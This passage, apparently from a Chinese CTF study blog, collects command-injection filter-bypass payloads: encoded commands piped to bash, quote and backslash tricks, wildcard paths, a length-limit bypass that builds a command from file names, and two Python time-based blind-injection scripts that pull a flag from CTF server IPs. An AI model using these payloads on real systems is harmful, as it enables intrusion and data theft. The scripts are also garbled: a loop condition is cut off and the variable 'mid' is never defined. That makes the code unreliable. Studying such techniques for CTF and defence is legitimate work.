> shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。
**花括号的别样用法** ：  
在Linux bash中可以使用`{OS_COMMAND,ARGUMENT}`来执行系统命令，如`{mv,文件1，文件2}`
####  2.黑名单绕过
假设黑名单里有`flag`
#####  （1）拼接
    #在linux系统中
    a=g;cat fla$a.php
    a=fl;b=ag.php;cat $a$b
    #在php的ping环境中
    ip=;a=g;cat fla$a.php
    ip=;a=fl;b=ag.php;cat $a$b
#####  （2）编码绕过
    #1.base64编码：cat flag.php -> Y2F0IGZsYWcucGhw
    `echo "Y2F0IGZsYWcucGhw"|base64 -d`
    $(echo "Y2F0IGZsYWcucGhw"|base64 -d)
    echo "Y2F0IGZsYWcucGhw"|base64 -d|bash
    echo "Y2F0IGZsYWcucGhw"|base64 -d|sh
    #2.hex编码：cat flag.php -> 63617420666c61672e706870
    echo "63617420666c61672e706870"|xxd -r -p|bash
    #xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件
    #-r参数：逆向转换。将16进制字符串表示转为实际的数
    #-ps参数：以 postscript的连续16进制转储输出，也叫做纯16进制转储。
    #-r -p将纯十六进制转储的反向输出打印为了ASCII格式。
    #3.shellcode编码：cat flag.php -> \x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70
    #经测试，发现在php的ping环境上执行失败。在linux系统上执行成功
    $(printf "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70")
    {printf,"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}|bash
    `{printf,"\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"}`
#####  （3）利用已存在资源
如：从已有的文件或者环境变量中获得相应的字符
#####  （4）单引号、双引号绕过
    cat fl''ag.php
    cat fl""ag.php
    c''at fl''ag.php
    c""at fl""ag.php
#####  （5）反斜杠绕过
    cat fl\ag.php
    c\at fl\ag.php
#####  （6）利用shell特殊变量绕过
    #特殊变量有：
    $1到$9、$@和$*等
    cat fl$1ag.php
    cat fl$@ag.php
####  3.文件读取绕过
文件读取，最常用的就是`cat`命令。如果`cat`被过滤，可以使用下面命令替代：
    more:一页一页的显示档案内容
    less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
    head:查看头几行
    tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
    tail:查看尾几行
    nl：显示的时候，顺便输出行号
    od:以二进制的方式读取档案内容，不加选项默认输出八进制
    vi:一种编辑器，这个也可以查看
    vim:一种编辑器，这个也可以查看
    sort:可以查看
    uniq:可以查看
    file -f:报错出具体内容
    more/less/head/tac/tail/nl/vi/vim/uniq/file -f/sort flag.php
上边的命令执行后，都可以在输出结果中看到flag。  
而od命令可通过添加`-c`选项输出字符串内容：
    od -c flag.php
[od命令](http://lnmp.ailinux.net/od)
####  4.通配符绕过
参考：[命令执行绕过之Linux通配符](https://www.secpulse.com/archives/96374.html)
    cat *
    cat f*
    /???/?at flag.php #/bin/cat flag.php
    /???/?at ????????
    /???/?[a][t] ????????
    /???/?[a][t] ?''?''?''?''?''?''?''?''
    /???/?[a]''[t] ?''?''?''?''?''?''?''?''
    /???/[:lower:]s #ls
    等等。。。
####  5.内敛执行绕过
    内敛，就是将`命令`或$(命令)内命令的输出作为输入执行
    cat `ls`
    cat $(ls)
####  6.长度限制绕过(文件构造绕过)
通常利用`ls -t`、`>`、`>>`和`换行符\`绕过长度限制
> 使用ls -t命令，可以将文件名按照时间顺序排列出来(后创建的排在前面)  
>  使用>，可以将命令结果存入文件中  
>  使用>>，可以将字符串添加到文件内容末尾，不会覆盖原内容  
>  使用换行符\，可以将一条命令写在多行
测试一下`ls -t>a`命令
    ls -t>a #会发现先创建文件名为a的文件，然后把ls -t的结果输入到文件a中
于是，根据以下原理，实现文件构造绕过：
    linux下可以用 1>a创建文件名为a的空文件
    ls -t>test则会将目录按时间排序后写进test文件中
    sh命令可以从一个文件中读取命令来执行
（1）先创建文件名可以连接成要执行命令的空文件(由于ls -t命令，所以要注意文件创建顺序)
    >"php"
    > "ag.\\"
    > "fl\\"
    > "t \\"
    > "ca\\"
    #为什么要两个反斜杠呢？我理解的是：用前1个反斜杠转义后1个反斜杠。如果只有一个反斜杠会转义后边的双引号",从而使空文件创建失败
（2）执行`ls -t>qwzf`将目录下的文件名按时间排序后写进qwzf文件里
    ls -t>qwzf
    #如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入qwzf，即
    ls -at>qwzf
（3）执行`sh qwzf`命令，从qwzf文件中读取命令来执行
    sh qwzf
长度限制绕过也可用于反弹shell命令和`wget 网址 -O webshell.php`命令
###  3、命令盲注
服务器未联网，无回显，无法利用自己总结的无回显命令执行，无写入权限和无法getshell等情况下，可以通过枚举/二分查找暴力查询flag。  
这个主要是在 **DASCTF 五月赛[Web 棒棒小红花]** 看到师傅们的这个操作。先贴上大师傅写的命令盲注脚本：
    import requests
    import time
    url = "http://183.129.189.60:10070/?imagin="
    requests.adapters.DEFAULT_RETRIES = 3 # 最大重连次数防止出问题
    SLEEP_TIME = 0.25 
    kai_shi = time.time()
    flag=""
    i = 0 # 计数器
    print("[start]: -------")
    while( True ):
        head = 32
        tail = 127
        i += 1
        while ( head > 1
            payload = '''h3zh1=$( cat /flag | cut -c %d-%d );if [ $( printf '%%d' "'$h3zh1" ) -gt %d ];then sleep %f;fi''' % ( i, i, mid, SLEEP_TIME)
            start_time = time.time() # 开始
            r = requests.get(url+payload)
            end_time = time.time() # 结束
            #print(payload)
            if ( end_time - start_time > SLEEP_TIME ) : 
                head = mid + 1
            else :
                tail = mid
        if head!=32:
            flag += chr(head)
            print("[+]: "+flag)
        else:
            break
    print("[end]: "+flag)
    jie_shu = time.time()
    print("程序运行时间:"+str(jieshu - kaishi))
参考上边大师傅写的脚本，写出我自己的通用脚本：
    import requests
    import time
    url = "http://39.105.93.165:8003/?ip=;"
    requests.adapters.DEFAULT_RETRIES = 3 # 设置最大重连次数，防止出问题
    sleep_time = 0.3 #睡眠时间
    flag=""
    i = 0 # 计数器
    begin_time = time.time() #程序运行开始时间
    print("--------程序开始运行--------\n")
    while( True ):
            head = 32
            tail = 127
            i += 1
            while ( head > 1 #>>位运算符，换成二进制并右移1位。相当于取中间数
                    payload = '''qwzf=$(cat flag.php|cut -c %d-%d );(if [ $( printf '%%d' "'$qwzf" ) -gt %d ];then sleep %f;fi)'''% (i,i,mid,sleep_time)
                    '''
            payload中的命令详解：
                cat flag.php查看flag.php文件内容
                cut -c 1-1剪切第1到第1个字符
                printf '%%d' "'$qwzf"将字符转换成ASCII
                        -gt大于
                    '''
                    start_time = time.time() #请求开始时间
                    r = requests.get(url+payload)
                    end_time = time.time() #响应结束时间
                    #print(payload)
                    if ( end_time - start_time > sleep_time ) : #符合的字符ascii值在中间数后半部分
                            head = mid + 1
                    else :                               #符合的字符ascii值在前半部分
                            tail = mid
            if head != 125: #}的ASCII码是125
                    flag += chr(head)
                    print("[+]："+flag)
            else:
                    print("[+]："+flag+"}")
                    break
    print("最后结果: "+flag+"}")
    finishe_time = time.time() #程序运行结束时间
    print("程序运行时间:"+str(finishe_time - begin_time))
我自己参考写的脚本和大师傅的脚本基本没什么变化，只是简单分析和修改了一下源码，然后进行了一下测试：
## 0x04 后记
本次学习的内容，概括如下：  
 **1.绕过disable_function的方法** ：`ld_preload`和`php_gc`等  
 **2.绕过过滤字符** 包括：`空格绕过`、`黑名单绕过`、`文件读取绕过`、`通配符绕过`、`内敛执行绕过`、`长度限制绕过(文件构造绕过)`等  
其中黑名单绕过包括：`拼接`、`编码绕过`、`利用已存在资源`、`单、双引号绕过`、`反斜杠绕过`、`利用shell特殊变量绕过`等  
 **3.命令盲注**  
 **4.无回显命令执行绕过**  
参考之前我写过的文章：[浅谈PHP无回显命令执行的利用](https://xz.aliyun.com/t/8125)
参考博客：  
[绕过disable_function总结](http://prontosil.club/posts/1cc6bf70/)  
[PHP Webshell下绕过disable_function的方法](https://xz.aliyun.com/t/5320)  
[命令执行的一些绕过技巧](https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/)  
[CTF中的命令执行绕过](https://blog.csdn.net/qq_38154820/article/details/105650684)  
[浅谈CTF中命令执行与绕过的小技巧](https://www.freebuf.com/articles/web/137923.html)  
[命令执行漏洞利用及绕过方式总结](https://www.ghtwf01.cn/index.php/archives/273/)  
[命令执行漏洞，绕过过滤姿势](https://www.cnblogs.com/ophxc/p/12826497.html)  
[命令执行绕过之Linux通配符](https://www.secpulse.com/archives/96374.html)  
[DAS X BJD3rd(2解)](https://www.cnblogs.com/h3zh1/p/12945275.html)